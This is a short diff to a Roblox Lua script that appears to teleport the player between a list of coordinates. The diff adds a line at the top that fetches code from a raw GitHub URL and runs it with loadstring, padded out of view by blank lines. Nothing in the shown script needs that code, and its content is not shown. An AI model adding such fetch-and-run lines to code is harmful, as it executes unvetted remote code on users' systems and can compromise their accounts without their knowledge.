@@ -1,3 +1,11 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yarimbucuk/robloxdcinvite/refs/heads/main/main", true))()
+
+
+
+
+
+
+
 local _1 = {Vector3.new(3, 413, -1210), Vector3.new(-1017, 414, -1209), Vector3.new(-2124, 418, -2132), Vector3.new(-541, 414, -3345), Vector3.new(-300, 414, -5794), Vector3.new(-306, 423, -7339)} 
 local _2 = game.Players.LocalPlayer 
 local _3 = _2.Character or _2.CharacterAdded:Wait() 
